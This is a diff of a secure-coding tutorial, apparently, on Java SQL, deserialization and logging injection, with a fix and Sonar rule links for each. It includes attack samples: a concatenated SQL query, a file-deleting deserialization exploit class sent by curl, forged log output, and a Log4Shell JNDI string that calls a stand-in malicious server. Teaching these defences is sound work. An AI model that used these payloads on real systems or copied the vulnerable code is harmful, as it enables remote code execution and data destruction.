@@ -65,7 +65,6 @@ public List findUsers(String user, String pass) throws Exception {
 }
 ```
 
-
  |
 
 However, when the attacker uses injection techniques, this code, using string interpolation, will result in unexpected results, allowing the attacker to log into the application.
@@ -79,13 +78,11 @@ String query = "SELECT userid FROM users " +
                "WHERE username='" + user + "' AND password='" + pass + "'";
 ```
 
-
 Changing the inclusion of the parameter values directly in the SQL String, to parameters that we can reference later will solve the problem of hacked queries.
 
 ```java
 String query = "SELECT userid FROM users WHERE username = ? AND password = ?";
 ```
-
 
 Our fixed code will look like this, with the prepareStatement and the value setting for each parameter.
 
@@ -104,7 +101,6 @@ public List findUsers(String user, String pass) throws Exception {
    }
 }
 ```
-
 
 The SonarQube and SonarCloud rules that help detect the SQL injection vulnerability can be found [here](https://rules.sonarsource.com/java/RSPEC-3649 "here")
 
@@ -136,7 +132,6 @@ class User implements Serializable {
 }
 ```
 
-
 We can see here that we are using `objectIS`, a direct value coming from the user in the request input stream, and converting it to a new object.  
 
 We expect that the value will always be one of the classes that our application uses. Sure, our client would never send anything else, right? Would they?
@@ -158,7 +153,6 @@ public class Exploit implements Serializable {
 }
 ```
 
-
 In this case, we have a class that deletes a file during the overridden `readObject` method, which will happen on the previous `readObject` call.
 
 The attacker only needs to serialize this class and send it to the API:
@@ -172,13 +166,11 @@ The attacker only needs to serialize this class and send it to the API:
 $ curl -X POST --data-binary @exploit.ser http://vulnerable-api.com/user
 ```
 
-
 This will cause our call to fail with a class cast Exception, but this won't prevent it from executing the malicious code that happens before the cast.
 
 ```java
 java.lang.ClassCastException: class org.vulnerable.Exploit cannot be cast to class org.vilojona.topsecurityflaws.deserialization.User
 ```
-
 
 Fortunately, there's an easy way to fix this. We need to check if the class to be deserialized is from one of the allowed types before creating the object.
 
@@ -209,7 +201,6 @@ In the code below, we have created a new ObjectInputStream with the "resolveClas
  }
 ```
 
-
 The SonarCloud/SonarQube and SonarLint rules that help detect the deserialization injection vulnerability can be found [here](https://rules.sonarsource.com/java/RSPEC-5135 "here")
 
 ### Logging injection
@@ -235,7 +226,6 @@ public void doGet(HttpServletRequest request, HttpServletResponse response) {
 }
 ```
 
-
 It looks harmless, right?
 
 But what if the attacker tries to log in with this user?
@@ -250,13 +240,11 @@ It's clearly a wrong user name and it will fail. But, it will be logged and the 
 2024-08-19 12:34:56 ERROR User 'admin' login in
 ```
 
-
 Or even worse !! If the attacker knows the system is using a non-patched Log4J version, they can send the below value as the user and the system will suffer from remote execution. The LDAP server controlled by the attacker responds with a reference to a malicious Java class hosted on a remote server. The vulnerable application downloads and executes this class, giving the attacker control over the server.
 
 ```
 $ { jndi:ldap://malicious-server.com/a}
 ```
-
 
 But we can prevent these issues easily.
 
@@ -276,20 +264,17 @@ private String sanitiseInput(String input) {
  }
 ```
 
-
 The result we'll see in the logs is the following, making it now easier to see that all the logs belong to the same call to the log system.
 
 ```
 2024-08-19 12:34:56 INFO User 'john' login in_2024-08-19 12:34:56 ERROR User 'admin' login in
 ```
 
-
 In order to prevent the exploit to the logging system, it's important to keep our libraries updated to the latest stable versions as much as possible. For log4j, that remediation would disable the functionality. We can also manually disable JNDI.
 
 ```
 -Dlog4j2.formatMsgNoLookups=true
 ```
-
 
 If you still need to use JNDI, then a common sanitizing process could avoid malicious attacks by just checking the destination against an allowed destinations list.
 
@@ -326,13 +311,11 @@ public class AllowedlistJndiContextFactory implements InitialContextFactory {
 }
 ```
 
-
 And configure our system to use the filtering context factory.
 
 ```
 -Djava.naming.factory.initial=com.yourpackage.AllowedlistJndiContextFactory
 ```
-
 
 The SonarCloud/SonarQube and SonarLint rules that help detect the logging injection vulnerability can be found [here](https://rules.sonarsource.com/java/RSPEC-5145 "here")
 
